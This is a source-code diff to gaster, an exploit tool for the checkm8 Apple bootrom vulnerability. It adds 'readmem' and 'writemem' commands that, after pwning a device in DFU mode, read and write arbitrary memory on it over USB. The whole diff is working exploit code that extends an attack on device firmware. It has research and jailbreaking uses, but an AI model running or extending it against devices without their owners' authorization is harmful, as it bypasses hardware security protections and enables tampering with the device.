@@ -1064,12 +1064,14 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	}
 	if(payload != NULL) {
 		if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
+			//A11x here
 			if(payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
 				payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
 				payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
 				if(cpid == 0x8003 || cpid == 0x8000) {
 					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
+					//A11x here
 					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				} else {
 					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
@@ -1519,7 +1521,7 @@ gaster_aes(usb_handle_t *handle, uint32_t cmd, const uint8_t *src, uint8_t *dst,
 		exec_cmd.x[3] = len;
 		exec_cmd.x[4] = options;
 		exec_cmd.x[5] = 0;
-		exec_cmd.x[6] = 0;
+		exec_cmd.x[6] = 0;//args
 		memcpy(data, &exec_cmd, sizeof(exec_cmd) - sizeof(r));
 		data_sz = sizeof(exec_cmd) - sizeof(r);
 		memcpy(data + data_sz, src, len);
@@ -1596,6 +1598,87 @@ gaster_decrypt_kbag(usb_handle_t *handle, const char *kbag_str) {
 }
 
 static bool
+gaster_readmem(usb_handle_t *handle, const char *addr_str) {
+	uint64_t addr = strtoull(addr_str, NULL, 16);
+	size_t len = 16;
+	uint8_t data[DFU_MAX_TRANSFER_SZ], *response;
+	struct {
+		uint64_t magic, pad, dst, src, len;
+	} exec_cmd;
+	size_t data_sz;
+	uint64_t r;
+
+	gaster_checkm8(handle);
+	exec_cmd.magic = MEMC_MAGIC;
+	exec_cmd.pad = 0;
+	exec_cmd.dst = insecure_memory_base + 16;
+	exec_cmd.src = addr;
+	exec_cmd.len = len;
+
+	memcpy(data, &exec_cmd, sizeof(exec_cmd));
+	data_sz = sizeof(exec_cmd);
+		if(gaster_command(handle, data, data_sz, &response, len + 2 * sizeof(r))) {
+		memcpy(&r, response, sizeof(r));
+		if(r != DONE_MAGIC) {
+			printf("[-]gaster_readmem response[0] is not DONE_MAGIC, which is %llx\n", r);
+			free(response);
+			return false;
+		}
+		memcpy(&r, response + sizeof(r), sizeof(r));
+		printf("[+]gaster_readmem response[1] (dest) is %llx\n", r);
+		//memcpy(dst, response + 2 * sizeof(r), len);
+		for(size_t i=2; i < len/8+2; i++){
+			memcpy(&r, response + i * sizeof(r), sizeof(r));
+			printf("[+]gaster_readmem response[%zd] is %llx\n", i, r);
+		}
+		free(response);
+		return true;
+	}
+	return false;
+}
+
+static bool
+gaster_writemem(usb_handle_t *handle, const char *addr_str, const char* value_str) {
+	uint64_t addr = strtoull(addr_str, NULL, 16);
+	uint64_t value = strtoull(value_str, NULL, 16);
+	size_t len = 8;
+	uint8_t data[DFU_MAX_TRANSFER_SZ], *response;
+	struct {
+		uint64_t magic, pad, dst, src, len, value;
+	} exec_cmd;
+	size_t data_sz;
+	uint64_t r;
+
+	gaster_checkm8(handle);
+	exec_cmd.magic = MEMC_MAGIC;
+	exec_cmd.pad = 0;
+	exec_cmd.dst = addr;
+	exec_cmd.src = insecure_memory_base + 16 + 3 * sizeof(r);
+	exec_cmd.len = len;
+	exec_cmd.value = value;
+
+	memcpy(data, &exec_cmd, sizeof(exec_cmd));
+	data_sz = sizeof(exec_cmd);
+		if(gaster_command(handle, data, data_sz, &response, len + 2 * sizeof(r))) {
+		memcpy(&r, response, sizeof(r));
+		if(r != DONE_MAGIC) {
+			printf("[-]gaster_writemem response[0] is not DONE_MAGIC, which is %llx\n", r);
+			free(response);
+			return false;
+		}
+		memcpy(&r, response + sizeof(r), sizeof(r));
+		printf("[+]gaster_writemem response[1] (dest) is %llx\n", r);
+		//memcpy(dst, response + 2 * sizeof(r), len);
+		memcpy(&r, response + 2 * sizeof(r), sizeof(r));
+		printf("[+]gaster_writemem response[2] is %llx\n", r);
+		free(response);
+		return true;
+	}
+	return false;
+}
+
+
+static bool
 gaster_decrypt_file(usb_handle_t *handle, const char *src_filename, const char *dst_filename) {
 	uint8_t *buf, *dec;
 	size_t len, dec_sz;
@@ -1657,6 +1740,14 @@ main(int argc, char **argv) {
 		if(gaster_decrypt_kbag(&handle, argv[2])) {
 			ret = 0;
 		}
+	} else if(argc == 3 && strcmp(argv[1], "readmem") == 0) {
+		if(gaster_readmem(&handle, argv[2])) {
+			ret = 0;
+		}
+	} else if(argc == 4 && strcmp(argv[1], "writemem") == 0) {
+		if(gaster_writemem(&handle, argv[2], argv[3])) {
+			ret = 0;
+		}
 	} else {
 		printf("Usage: env %s options\n", argv[0]);
 		puts("env:");
@@ -1667,6 +1758,8 @@ main(int argc, char **argv) {
 		puts("pwn - Put the device in pwned DFU mode");
 		puts("decrypt src dst - Decrypt file using GID0 AES key");
 		puts("decrypt_kbag kbag - Decrypt KBAG using GID0 AES key");
+		puts("readmem addr");
+		puts("writemem addr value");
 	}
 	return ret;
 }
